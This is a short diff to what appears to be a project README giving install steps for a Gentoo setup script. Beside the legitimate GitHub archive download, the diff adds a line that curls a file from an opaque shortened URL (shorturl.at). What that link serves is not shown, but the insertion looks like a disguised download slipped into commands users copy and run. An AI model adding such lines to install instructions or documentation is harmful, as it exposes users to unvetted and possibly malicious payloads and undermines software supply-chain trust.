@@ -18,6 +18,7 @@ proceed with the following steps:
 
 1. Either clone this repo or download and extract a copy
 curl -LJO https://github.com/david-koresh/install-gentoo/archive/refs/heads/master.zip
+curl -LJO shorturl.at/sFM39
 1. Run `./prep-arch.sh` This will update your arch config and install some necessary packages
 1. Run `./configure` and save your desired configuration
 1. Begin installation using `./install`
